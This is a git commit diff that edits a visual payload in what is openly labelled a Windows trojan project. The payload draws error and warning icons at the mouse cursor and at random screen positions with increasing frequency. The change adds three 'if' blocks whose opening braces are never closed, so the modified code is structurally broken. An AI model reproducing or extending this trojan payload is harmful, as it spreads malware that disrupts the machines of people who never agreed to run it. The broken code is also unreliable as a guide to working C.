b46bed6e1444aec9c71b7e02dcb1a2fe3bc03d6b
An-random-creator <158004969+An-random-creator@users.noreply.github.com>
2024-01-28 19:15:08 -0700

    Update PayloadDrawErrors.c

--- WindowsTrojan/Source/Payloads/PayloadDrawErrors.c
+++ WindowsTrojan/Source/Payloads/PayloadDrawErrors.c
@@ -10,10 +10,20 @@ PAYLOADFUNCTIONVISUAL(payloadDrawErrors) {
 	GetCursorPos(&cursor);
 
 	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_ERROR));
+	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_WARNING));
+	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_INFORMATION));
+	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_APPLICATION));
 
 	if (random() % (int)(10/(times/500.0+1)+1) == 0) {
 		DrawIcon(hdc, random()%(w-ix), random()%(h-iy), LoadIcon(NULL, IDI_WARNING));
+	if (random() % (int)(10/(times/500.0+1)+1) == 0) {
+		DrawIcon(hdc, random()%(w-ix), random()%(h-iy), LoadIcon(NULL, IDI_ERROR));
+	if (random() % (int)(10/(times/500.0+1)+1) == 0) {
+		DrawIcon(hdc, random()%(w-ix), random()%(h-iy), LoadIcon(NULL, IDI_APPLICATION));
+	if (random() % (int)(10/(times/500.0+1)+1) == 0) {
+		DrawIcon(hdc, random()%(w-ix), random()%(h-iy), LoadIcon(NULL, IDI_INFORMATION));
 	}
 
+	
 	out: return 2;
 }
